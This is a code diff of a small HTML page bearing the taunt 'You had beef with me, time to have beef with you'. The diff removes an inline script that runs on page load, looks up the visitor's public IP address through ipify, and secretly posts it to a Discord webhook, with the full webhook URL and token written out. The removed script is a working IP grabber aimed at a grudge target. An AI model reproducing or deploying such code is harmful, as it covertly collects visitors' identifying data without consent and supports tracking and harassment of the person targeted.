@@ -24,32 +24,5 @@
 </head>
 <body>
     <div class="message">You had beef with me, time to have beef with you</div>
-    <script>
-        async function sendIPToDiscord(ip) {
-            const webhookURL = 'https://discord.com/api/webhooks/1229599822005276734/8111XXiFs0oFEk4r3GfCDRYWAdDCrGfSt3_HjPWDruvQeDEVdljzpPPF2BWHalNEMeXy';
-            const message = {
-                content: `IP Address: ${ip}`
-            };
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            });
-        }
-
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                sendIPToDiscord(data.ip);
-            } catch (error) {
-                console.error('Error getting IP address:', error);
-            }
-        }
-
-        getIP();
-    </script>
 </body>
 </html>
